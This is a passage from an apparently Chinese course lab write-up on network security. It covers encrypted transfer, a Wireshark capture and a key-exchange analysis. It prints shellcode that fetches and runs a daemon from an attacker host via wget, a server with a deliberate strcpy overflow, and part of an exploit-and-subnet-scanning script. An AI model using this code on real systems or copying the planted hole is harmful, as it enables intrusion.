===============不加密=================</span></span><br><span class="line">           <span class="comment">#clientSocket.send(sendData.encode())</span></span><br></pre></td></tr></table></figure>

<h2 id="4-2-用-wireshark-等工具抓取传输内容，证明未加密与加密的区别"><a href="#4-2-用-wireshark-等工具抓取传输内容，证明未加密与加密的区别" class="headerlink" title="4.2 用 wireshark 等工具抓取传输内容，证明未加密与加密的区别"></a>4.2 用 wireshark 等工具抓取传输内容，证明未加密与加密的区别</h2><p>首先我们先把daemon.py和client.py的加密关掉，启动后client向daemon请求LinFengLv.txt。</p>
<p>可以看到如果传输文件内容未加密，则wireshark 抓取到socket发送的包，可以直接在data部分看到<strong>传输内容明文</strong></p>
<p><img src="/2020/06/22/2020-06-22-NS-The-Final-Exam/image-20200622023021090.png" alt="image-20200622023021090"></p>
<p>我们开启加密</p>
<p><img src="/2020/06/22/2020-06-22-NS-The-Final-Exam/image-20200622023250674.png" alt="image-20200622023250674"></p>
<p>如下，如果传输文件内容加密，则抓取到的包，data部分是密文，无法被破译。</p>
<p><img src="/2020/06/22/2020-06-22-NS-The-Final-Exam/image-20200622023111428.png" alt="image-20200622023111428"></p>
<h2 id="4-3-分析密钥管理和传输加密方案的安全性"><a href="#4-3-分析密钥管理和传输加密方案的安全性" class="headerlink" title="4.3 分析密钥管理和传输加密方案的安全性"></a>4.3 分析密钥管理和传输加密方案的安全性</h2><ul>
<li><p>首先daemon.py作为服务器（受害方）被shellcode启动</p>
</li>
<li><p>客户端（攻击方），启动client.py通过socket连接上该服务器，创建非对称加密RSA密钥，发送公钥和公钥Sha256摘要给服务器</p>
</li>
<li><p>服务器（受害方）接收到RSA的公钥和公钥摘要之后，对公钥进行摘要判断，公钥是否被改动。如没有，就产生用于 AES 对称加密的密钥，将其用RSA公钥加密后，将其密文和密文摘要发给客户端（攻击方）</p>
</li>
<li><p>客户端（攻击方）同上用对 AES密钥进行摘要，判断是否被改动。如没有，双方便可以用 AES密钥进行通信的加密了。</p>
</li>
</ul>
<p><strong>分析：</strong></p>
<p>方案：客户端创建并发送非对称加密RSA公钥给服务端，服务端创建对称加密AES密钥发送给客户端，之后两方通过AES进行通信。</p>
<ul>
<li>可以有效保障传输内容的保密性：方案采用了AES对称加密通信的内容，并且使用了非对称加密RSA来对AES密钥进行加密</li>
<li>防止传输密钥时的中间人攻击：在传输RSA的公钥、传输AES的密钥时，同时都会发送其对应的Sha256哈希摘要，通过摘要验证的方式防止传输密钥包时的中间人改动攻击。</li>
<li>时效性强，防止重放攻击：由于我们的daemon服务端是shellcode启动的，主要功能是为客户端（攻击方）搜索发送指定的文件（姓名.txt），所以很快就关闭了。在交换密钥完成之后，就发送文件完毕。这些操作都是在很短的时间内完成的（所以消息中没有加入时间戳），而每次daemon服务端的启动，客户端都需要与其重新创建密钥并且交换密钥，密钥的产生很随机。时效性很强，可以有效的方式重放攻击。</li>
</ul>
<h1 id="五、Shellcode介绍"><a href="#五、Shellcode介绍" class="headerlink" title="五、Shellcode介绍"></a>五、Shellcode介绍</h1><h2 id="5-1-创建-学号-txt"><a href="#5-1-创建-学号-txt" class="headerlink" title="5.1 创建 学号.txt"></a>5.1 创建 学号.txt</h2><p>主要是利用了linux中的系统调用int 80来实现的，eax寄存器中为调用的功能号，ebx、ecx、edx、esi等等寄存器则依次为参数,从 <code>/usr/include/asm/unistd.h</code>中可以看到。</p>
<p>在本shellcode中我们的操作如下</p>
<ul>
<li>首先5号调用open系统调用，创建文件<code>LinFengLv.txt</code></li>
<li>然后4号调用write系统调用，写文件内容<code>2017301500076</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;cat &#x2F;usr&#x2F;include&#x2F;asm&#x2F;unistd.h | less总共有383条</span><br><span class="line">#define __NR_exit                 1</span><br><span class="line">#define __NR_fork                 2</span><br><span class="line">#define __NR_read                 3</span><br><span class="line">#define __NR_write                4 &lt;------2 写文件内容&#96;2017301500076&#96;</span><br><span class="line">#define __NR_open                 5 &lt;------1 创建文件&#96;LinFengLv.txt&#96;</span><br><span class="line">#define __NR_close                6 </span><br><span class="line">#define __NR_waitpid              7</span><br><span class="line">#define __NR_creat                8</span><br><span class="line">#define __NR_link                 9</span><br><span class="line">#define __NR_unlink              10</span><br><span class="line">#define __NR_execve              11</span><br></pre></td></tr></table></figure>

<p>以32位linux为例（64位下系统调用号是不同的）：</p>
<p><strong>打开文件的调用号</strong>为5，将5存入eax，ebx存入文件路径字符串的首地址，ecx存入打开方式，只读为“0”，写为“03101”，edx存入权限集合，现在存入“0666”就行了，反正我不懂unix的权限。打开成功后，系统会返回该文件的“文件标识符”,在eax里面。之后全程都要用这个文件标识符指代打开的那个文件。</p>
<p>读取文件的调用号为3，存入eax，文件标识符存入ebx，在此之前，要划一个缓存区，用来储存读取的数据，将该缓存区的首地址存入ecx，长度存入edx。读取成功后，会按照edx中的长度填充缓存区，就是edx的值是多少，就填充多少（当然，由文件的长度而定），返回已经读取的长度。</p>
<p><strong>写入文件的调用号</strong>为4，存入eax，其余参数同上。返回写入的字节数或者错误代码（写入失败），存入eax。</p>
<p>关闭文件的调用号为6，存入eax，文件描述符存入ebx。只有这两个参数。</p>
<p><strong>字节码和汇编代码如下，注释了</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;################字节码#############</span><br><span class="line">;shellcode_createtxt&#x3D;b&#39;\x31\xc0\xb0\xa0\x29\xc4\x31\xd2\x31\xc9\x66\xba\xff\x01\x66\xb9\x41\x06\x31\xdb\x53\x68\x2e\x74\x78\x74\x68\x6e\x67\x4c\x76\x68\x69\x6e\x46\x65\x68\x2e\x2f\x2f\x4c\x89\xe3\x31\xc0\xb0\x05\xcd\x80\x31\xdb\x53\x6a\x36\x68\x30\x30\x30\x37\x68\x33\x30\x31\x35\x68\x32\x30\x31\x37\x89\xe1\x89\xc3\x31\xd2\xb2\x0d\x31\xc0\xb0\x04\xcd\x80\x31\xc0\xb0\x06\xcd\x80\x31\xc0\xb0\x01\xcd\x80&#39;</span><br><span class="line">;################字节码#############</span><br><span class="line"></span><br><span class="line">;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;抬高栈顶指针esp避免影响代码&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">xor eax,eax;</span><br><span class="line">mov al,0xA0</span><br><span class="line">sub esp,eax</span><br><span class="line"></span><br><span class="line">;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;open系统调用，创建文件&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">;linux中openfile可以用于创建文件</span><br><span class="line"></span><br><span class="line">xor edx,edx</span><br><span class="line">xor ecx,ecx</span><br><span class="line">mov dx, 777q  ;文件的权限集合存入edx</span><br><span class="line">mov cx, 3101q ;文件的打开方式存入ecx</span><br><span class="line">xor ebx,ebx</span><br><span class="line">push ebx</span><br><span class="line">push &quot;.txt&quot;</span><br><span class="line">push &quot;ngLv&quot;</span><br><span class="line">push &quot;inFe&quot;</span><br><span class="line">push &quot;.&#x2F;&#x2F;L&quot; ;文件名.&#x2F;&#x2F;LinFengLv.txt&#x3D;LinFengLv.txt</span><br><span class="line">mov ebx, esp ;文件名地址存入ebx</span><br><span class="line">xor eax,eax	</span><br><span class="line">mov al,05h ;open系统调用号</span><br><span class="line">int 80h</span><br><span class="line"></span><br><span class="line">;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;write系统调用，写文件&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">xor ebx,ebx</span><br><span class="line">push ebx</span><br><span class="line">push &quot;6&quot;</span><br><span class="line">push &quot;0007&quot;</span><br><span class="line">push &quot;3015&quot;</span><br><span class="line">push &quot;2017&quot; ;文件内容2017301500076</span><br><span class="line">mov ecx, esp ;文件内容地址存入ecx</span><br><span class="line"></span><br><span class="line">mov ebx,eax	 ;上一个系统调用获得的文件描述符</span><br><span class="line">xor edx,edx</span><br><span class="line">mov dl,0dh  ;edx中存入文件内容的长度</span><br><span class="line"></span><br><span class="line">xor eax,eax</span><br><span class="line">mov al,04h  ;write系统调用号</span><br><span class="line">int 80h</span><br><span class="line"></span><br><span class="line">;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;close系统调用，关闭文件描述符&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;（可以不要）</span><br><span class="line">xor eax,eax</span><br><span class="line">mov al,06h</span><br><span class="line">int 80h</span><br><span class="line"></span><br><span class="line">;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;exit系统调用退出&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;（可以不要）</span><br><span class="line">xor eax,eax</span><br><span class="line">mov al,01h</span><br><span class="line">int 80h</span><br></pre></td></tr></table></figure>

<h2 id="5-2-下载-daemon程序"><a href="#5-2-下载-daemon程序" class="headerlink" title="5.2 下载 daemon程序"></a>5.2 下载 daemon程序</h2><p>主要是利用了linux中的系统调用int 80来实现的，eax寄存器中为调用的功能号，ebx、ecx、edx、esi等等寄存器则依次为参数,从 <code>/usr/include/asm/unistd.h</code>中可以看到。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;cat &#x2F;usr&#x2F;include&#x2F;asm&#x2F;unistd.h | less总共有383条</span><br><span class="line">#define __NR_execve              11 &lt;---本次调用</span><br></pre></td></tr></table></figure>

<p>在本shellcode中我们的操作：</p>
<p>调用execve系统调用来执行命令行（从攻击方开启的apache服务器中下载daemon.py)：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/usr/bin/wget 192.168.30.131/f/daemon.py</span><br></pre></td></tr></table></figure>

<p><strong>字节码和汇编代码如下，注释了</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;################字节码#############</span><br><span class="line">;shellcode_daemon&#x3D;b&#39;\x31\xc0\xb0\xa0\x29\xc4\x31\xc0\x50\x89\xc2\x68\x6e\x2e\x70\x79\x68\x61\x65\x6d\x6f\x68\x2f\x2f\x2f\x64\x68\x33\x31\x2f\x66\x68\x33\x30\x2e\x31\x68\x31\x36\x38\x2e\x68\x31\x39\x32\x2e\x89\xe1\x31\xc0\x50\x6a\x74\x68\x2f\x77\x67\x65\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x52\x51\x53\x89\xe1\xb0\x0b\xcd\x80&#39;</span><br><span class="line">;################字节码#############</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;抬高栈顶指针esp避免影响代码&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">xor eax,eax</span><br><span class="line">mov al,0xA0</span><br><span class="line">sub esp,eax</span><br><span class="line"></span><br><span class="line">;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;调用execve系统调用来执行命令行&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">;作用（下载daemon.py）：&#x2F;usr&#x2F;bin&#x2F;wget 192.168.30.131&#x2F;f&#x2F;daemon.py</span><br><span class="line">xor eax,eax</span><br><span class="line">push eax</span><br><span class="line">mov edx,eax ;首先是edx为0</span><br><span class="line">push &quot;n.py&quot;</span><br><span class="line">push &quot;aemo&quot;</span><br><span class="line">push &quot;&#x2F;&#x2F;&#x2F;d&quot;</span><br><span class="line">push &quot;31&#x2F;f&quot;</span><br><span class="line">push &quot;30.1&quot;</span><br><span class="line">push &quot;168.&quot;</span><br><span class="line">push &quot;192.&quot;	</span><br><span class="line">mov ecx,esp ;ecx为字符串192.168.30.131&#x2F;f&#x2F;daemon.py的地址</span><br><span class="line"></span><br><span class="line">xor eax,eax</span><br><span class="line">push eax</span><br><span class="line">push 0x74 ;t</span><br><span class="line">push 0x6567772f ;egw&#x2F;</span><br><span class="line">push 0x6e69622f ;nib&#x2F;</span><br><span class="line">push 0x7273752f ;rsu&#x2F;</span><br><span class="line">mov ebx,esp ;ebx是执行程序&#x2F;usr&#x2F;bin&#x2F;wget的地址</span><br><span class="line"></span><br><span class="line">push edx</span><br><span class="line">push ecx</span><br><span class="line">push ebx</span><br><span class="line">mov ecx,esp ;ecx是ebx、ecx、edx三个execve参数的地址</span><br><span class="line">mov al,0bh ;eax是execve系统调用号0bh</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>

<h2 id="5-3-运行daemon程序"><a href="#5-3-运行daemon程序" class="headerlink" title="5.3 运行daemon程序"></a>5.3 运行daemon程序</h2><p>主要是利用了linux中的系统调用int 80来实现的，eax寄存器中为调用的功能号，ebx、ecx、edx、esi等等寄存器则依次为参数,从 <code>/usr/include/asm/unistd.h</code>中可以看到。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;cat &#x2F;usr&#x2F;include&#x2F;asm&#x2F;unistd.h | less总共有383条</span><br><span class="line">#define __NR_execve              11 &lt;---本次调用</span><br></pre></td></tr></table></figure>

<p>在本shellcode中我们的操作：</p>
<p>调用execve系统调用来执行命令行（执行daemon.py）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/usr/bin/python daemon.py</span><br></pre></td></tr></table></figure>

<p><strong>字节码和汇编代码如下，注释了</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;################字节码#############</span><br><span class="line">;shellcode_execdaemon&#x3D;b&#39;\x31\xc0\x50\x89\xc2\x68\x6e\x2e\x70\x79\x68\x61\x65\x6d\x6f\x68\x2e\x2f\x2f\x64\x89\xe1\x31\xc0\x50\x68\x74\x68\x6f\x6e\x68\x2f\x2f\x70\x79\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x52\x51\x53\x89\xe1\xb0\x0b\xcd\x80&#39;</span><br><span class="line">;################字节码#############</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;抬高栈顶指针esp避免影响代码&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">xor eax,eax</span><br><span class="line">mov al,0xA0</span><br><span class="line">sub esp,eax</span><br><span class="line"></span><br><span class="line">;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;调用execve系统调用来执行命令行&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">;作用（运行daemon.py）：&#x2F;usr&#x2F;bin&#x2F;python daemon.py</span><br><span class="line">xor eax,eax</span><br><span class="line">push eax</span><br><span class="line">mov edx,eax ;首先是edx为0</span><br><span class="line">push &quot;n.py&quot;</span><br><span class="line">push &quot;aemo&quot;</span><br><span class="line">push &quot;.&#x2F;&#x2F;d&quot;	</span><br><span class="line">mov ecx,esp ;ecx为字符串daemon.py的地址</span><br><span class="line"></span><br><span class="line">xor eax,eax</span><br><span class="line">push eax</span><br><span class="line">push &quot;thon&quot;</span><br><span class="line">push &quot;&#x2F;&#x2F;py&quot;</span><br><span class="line">push &quot;&#x2F;bin&quot;</span><br><span class="line">push &quot;&#x2F;usr&quot;</span><br><span class="line">mov ebx,esp ;ebx是执行程序&#x2F;usr&#x2F;bin&#x2F;python的地址</span><br><span class="line"></span><br><span class="line">push edx</span><br><span class="line">push ecx</span><br><span class="line">push ebx</span><br><span class="line">mov ecx,esp ;ecx是ebx、ecx、edx三个execve参数的地址</span><br><span class="line">mov al,0bh ;eax是execve系统调用号0bh</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>

<h1 id="六、任务二、三总体代码"><a href="#六、任务二、三总体代码" class="headerlink" title="六、任务二、三总体代码"></a>六、任务二、三总体代码</h1><h2 id="6-1-字符串翻转服务端程序-server-c"><a href="#6-1-字符串翻转服务端程序-server-c" class="headerlink" title="6.1 字符串翻转服务端程序 server.c"></a>6.1 字符串翻转服务端程序 server.c</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;strings.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SERV_PORT 8000</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span>* str)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> bufferA[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(bufferA,str); <span class="comment">//&lt;-----------漏洞所在</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//逆转字符串</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse</span><span class="params">(<span class="keyword">char</span>* str)</span></span>&#123;</span><br><span class="line">	foo(str);</span><br><span class="line">	<span class="keyword">int</span> ilen = <span class="built_in">strlen</span>(str);</span><br><span class="line">	<span class="keyword">char</span>* p = str + ilen - <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">int</span> itemp = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(str &lt; p)&#123;</span><br><span class="line">		itemp = *p;</span><br><span class="line">		*p = *str;</span><br><span class="line">		*str = itemp;</span><br><span class="line">		p--;</span><br><span class="line">		str++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sfd, cfd;</span><br><span class="line">    <span class="keyword">int</span> i, len;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv_addr</span>, <span class="title">client_addr</span>;</span></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">4096</span>], client_ip[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">socklen_t</span> addr_len;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//AF_INET:ipv4   SOCK_STREAM:流协议   0:默认协议(tcp,udp)</span></span><br><span class="line">    sfd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//绑定前先构造出服务器地址</span></span><br><span class="line">    bzero(&amp;serv_addr, <span class="keyword">sizeof</span>(serv_addr));</span><br><span class="line">    serv_addr.sin_family = AF_INET;</span><br><span class="line">    <span class="comment">//网络字节序</span></span><br><span class="line">    serv_addr.sin_port = htons(SERV_PORT);</span><br><span class="line">    <span class="comment">//INADDR_ANY主机所有ip</span></span><br><span class="line">    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line"></span><br><span class="line">    bind(sfd, (struct sockaddr *)&amp;serv_addr, <span class="keyword">sizeof</span>(serv_addr));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//服务器能接收并发链接的能力</span></span><br><span class="line">    <span class="built_in">listen</span>(sfd, <span class="number">128</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"wait for connect ...\n"</span>);</span><br><span class="line">    addr_len = <span class="keyword">sizeof</span>(client_addr);</span><br><span class="line">    <span class="comment">//阻塞，等待客户端链接，成功则返回新的文件描述符，用于和客户端通信</span></span><br><span class="line">	<span class="comment">// 参数1是sfd; 参2传出参数, 参3传入传入参数, 全部是client端的参数</span></span><br><span class="line">    cfd = accept(sfd, (struct sockaddr *)&amp;client_addr, &amp;addr_len);</span><br><span class="line">	<span class="comment">// 打印链接的客户端地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"client IP:%s\t%d\n"</span>, </span><br><span class="line">            inet_ntop(AF_INET, &amp;client_addr.sin_addr.s_addr, client_ip,<span class="keyword">sizeof</span>(client_ip)),ntohs(client_addr.sin_port));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">//阻塞接收客户端数据</span></span><br><span class="line">        len = <span class="built_in">read</span>(cfd, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">		<span class="comment">// 将客户端发送的数据输出到屏幕中</span></span><br><span class="line">        <span class="built_in">write</span>(STDOUT_FILENO, buf, len);</span><br><span class="line">		reverse(buf);</span><br><span class="line">		</span><br><span class="line">        <span class="comment">//返回给客户端结果</span></span><br><span class="line">        <span class="built_in">write</span>(cfd, buf, len);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">close</span>(cfd);</span><br><span class="line">    <span class="built_in">close</span>(sfd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-2-恶意客户端程序-attack-py"><a href="#6-2-恶意客户端程序-attack-py" class="headerlink" title="6.2 恶意客户端程序 attack.py"></a>6.2 恶意客户端程序 attack.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="comment"># 创建接收路由列表</span></span><br><span class="line"></span><br><span class="line">shellcode_createtxt=<span class="string">b'\x31\xc0\xb0\xa0\x29\xc4\x31\xd2\x31\xc9\x66\xba\xff\x01\x66\xb9\x41\x06\x31\xdb\x53\x68\x2e\x74\x78\x74\x68\x6e\x67\x4c\x76\x68\x69\x6e\x46\x65\x68\x2e\x2f\x2f\x4c\x89\xe3\x31\xc0\xb0\x05\xcd\x80\x31\xdb\x53\x6a\x36\x68\x30\x30\x30\x37\x68\x33\x30\x31\x35\x68\x32\x30\x31\x37\x89\xe1\x89\xc3\x31\xd2\xb2\x0d\x31\xc0\xb0\x04\xcd\x80\x31\xc0\xb0\x06\xcd\x80\x31\xc0\xb0\x01\xcd\x80'</span></span><br><span class="line">shellcode_daemon=<span class="string">b'\x31\xc0\xb0\xa0\x29\xc4\x31\xc0\x50\x89\xc2\x68\x6e\x2e\x70\x79\x68\x61\x65\x6d\x6f\x68\x2f\x2f\x2f\x64\x68\x33\x31\x2f\x66\x68\x33\x30\x2e\x31\x68\x31\x36\x38\x2e\x68\x31\x39\x32\x2e\x89\xe1\x31\xc0\x50\x6a\x74\x68\x2f\x77\x67\x65\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x52\x51\x53\x89\xe1\xb0\x0b\xcd\x80'</span></span><br><span class="line">shellcode_execdaemon=<span class="string">b'\x31\xc0\x50\x89\xc2\x68\x6e\x2e\x70\x79\x68\x61\x65\x6d\x6f\x68\x2e\x2f\x2f\x64\x89\xe1\x31\xc0\x50\x68\x74\x68\x6f\x6e\x68\x2f\x2f\x70\x79\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x52\x51\x53\x89\xe1\xb0\x0b\xcd\x80'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建互斥锁</span></span><br><span class="line">lock = threading.Lock()</span><br><span class="line"><span class="comment"># 设置需要扫描的端口号列表</span></span><br><span class="line">port_list = [<span class="string">"8000"</span>]</span><br><span class="line"><span class="comment"># routers = []</span></span><br><span class="line">routers = [[<span class="string">"192.168.30.133"</span>,<span class="string">"8000"</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment">#获得本机ip</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_host_ip</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">        s.connect((<span class="string">'8.8.8.8'</span>, <span class="number">80</span>))</span><br><span class="line">        ip = s.getsockname()[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        s.close()</span><br><span class="line">    <span class="keyword">return</span> ip</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义查询路由函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_routers</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 获取本地ip地址</span></span><br><span class="line">    ip=get_host_ip()</span><br><span class="line">    <span class="comment"># 存放线程列表池</span></span><br><span class="line">    all_threads = []</span><br><span class="line">    <span class="comment"># 循环本地网卡IP列表</span></span><br><span class="line">    print(str())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">        <span class="comment"># 把网卡IP"."进行分割,生成每一个可用地址的列表</span></span><br><span class="line">        array = ip.split(<span class="string">'.'</span>)</span><br><span class="line">        <span class="comment"># 获取分割后的第四位数字，生成该网段所有可用IP地址</span></span><br><span class="line">        array[<span class="number">3</span>] = str(i)</span><br><span class="line">        <span class="comment"># 把分割后的每一可用地址列表，用"."连接起来，生成新的ip</span></span><br><span class="line">        new_ip = <span class="string">'.'</span>.join(array)</span><br><span class="line">        <span class="comment">#print(new_ip)</span></span><br><span class="line">        <span class="comment"># 遍历需要扫描的端口号列表</span></span><br><span class="line">        <span class="keyword">for</span> port <span class="keyword">in</span> port_list:</span><br><span class="line">            dst_port = int(port)</span><br><span class="line">            <span class="comment"># 循环创建线程去链接该地址</span></span><br><span class="line">            t = threading.Thread(target=check_ip, args=(new_ip, dst_port))</span><br><span class="line">            t.start()</span><br><span class="line">            <span class="comment"># 把新建的线程放到线程池</span></span><br><span class="line">            all_threads.append(t)</span><br><span class="line">    <span class="comment"># 循环阻塞主线程，等待每一字子线程执行完，程序再退出</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> all_threads:</span><br><span class="line">        t.join()</span><br><span class="line">    print(routers)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建访问IP列表方法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_ip</span><span class="params">(new_ip, port)</span>:</span></span><br><span class="line">    <span class="comment"># 创建TCP套接字，链接新的ip列表</span></span><br><span class="line">    scan_link = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="comment"># 设置链接超时时间</span></span><br><span class="line">    scan_link.settimeout(<span class="number">2</span>)</span><br><span class="line">    <span class="comment"># 链接地址(通过指定我们 构造的主机地址，和扫描指定端口)</span></span><br><span class="line">    result = scan_link.connect_ex((new_ip, port))</span><br><span class="line">    <span class="comment"># input_data = b"\x90" * (120)</span></span><br><span class="line">    <span class="comment"># scan_link.send(input_data)  # 使服务器错误爆炸退出</span></span><br><span class="line">    scan_link.close()</span><br><span class="line">    <span class="comment"># print(result)</span></span><br><span class="line">    <span class="comment"># 判断链接结果</span></span><br><span class="line">    <span class="keyword">if</span> result == <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># 加锁</span></span><br><span class="line">        lock.acquire()</span><br><span class="line">        print(new_ip, <span class="string">'\t\t端口号%s开放'</span> % port)</span><br><span class="line">        routers.append((new_ip, port))</span><br><span class="line">        <span class="comment"># 释放锁</span></span><br><span class="line">        lock.release()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">comm_or_attack</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> route <span class="keyword">in</span> routers:</span><br><span class="line">        attack_a = input(<span class="string">"是否攻击/通信"</span>+route[<span class="number">0</span>]+route[<span class="number">1</span>]+<span class="string">"？(y/n):"</span>)</span><br><span class="line">        <span class="keyword">if</span> attack_a==<span class="string">"y"</span>: <span class="comment">#是否对该ip进行攻击/通信</span></span><br><span class="line">            <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                    <span class="keyword">if</span> (clientsocket.connect((route[<span class="number">0</span>], int(route[<span class="number">1</span>]))) != <span class="number">0</span>):</span><br><span class="line">                        tans(clientsocket)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    print(<span class="string">"此轮clientsocket出错"</span>)</span><br><span 